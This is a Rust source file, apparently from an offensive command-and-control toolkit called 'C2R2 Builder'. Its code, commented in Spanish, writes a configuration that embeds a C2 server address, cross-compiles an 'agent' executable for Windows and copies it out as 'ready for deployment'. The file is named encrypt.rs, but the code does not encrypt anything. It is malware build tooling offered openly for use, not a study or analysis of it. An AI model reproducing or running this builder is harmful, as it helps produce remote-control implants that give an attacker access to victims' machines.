// File: src/encrypt.rs
// Generador de agentes con conexión directa al servidor C2

use std::fs::File;
use std::io::Write;
use std::process::Command;

pub fn generate_agent(
    output_name: &str,
    c2_server: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("🔧 Generando configuración del agente...");

    // Detectar si estamos en target/release/ (igual que en main)
    let agent_path = if std::env::current_dir()?
        .to_string_lossy()
        .contains("target/release")
    {
        "../../agent"
    } else {
        "agent"
    };

    // Crear directorios si no existen
    let config_dir = format!("{}/src", agent_path);
    std::fs::create_dir_all(&config_dir)?;

    // Generar config.rs
    let config_file_path = format!("{}/src/config.rs", agent_path);
    let mut config_file = File::create(&config_file_path)?;

    writeln!(
        config_file,
        "// Generado automáticamente por C2R2 Builder v2.0"
    )?;
    writeln!(
        config_file,
        "pub const C2_SERVER: &str = \"{}\";",
        c2_server
    )?;

    println!("✅ Configuración escrita en {}", config_file_path);
    println!("🌐 Servidor C2 configurado: {}", c2_server);

    // Compilar el agente
    println!("🔨 Compilando agente para Windows...");
    
    // Convertir el path relativo a absoluto
    let agent_absolute = std::fs::canonicalize(agent_path)?;
    let manifest_path = agent_absolute.join("Cargo.toml");
    
    println!("📁 Manifest path: {}", manifest_path.display());
    
    let output = Command::new("cargo")
        .args(&[
            "build",
            "--release",
            "--target",
            "x86_64-pc-windows-gnu",
            "--manifest-path",
        ])
        .arg(&manifest_path)
        .output()?;

    if !output.status.success() {
        return Err(format!(
            "Error compilando el agente:\n{}",
            String::from_utf8_lossy(&output.stderr)
        )
        .into());
    }

    // Copiar el ejecutable
    let src_exe = format!(
        "{}/target/x86_64-pc-windows-gnu/release/agent.exe",
        agent_path
    );
    let dest_exe = format!("{}.exe", output_name);

    std::fs::copy(&src_exe, &dest_exe)?;

    println!("✅ Agente compilado: {}", dest_exe);
    println!("📦 Listo para despliegue");

    Ok(())
}
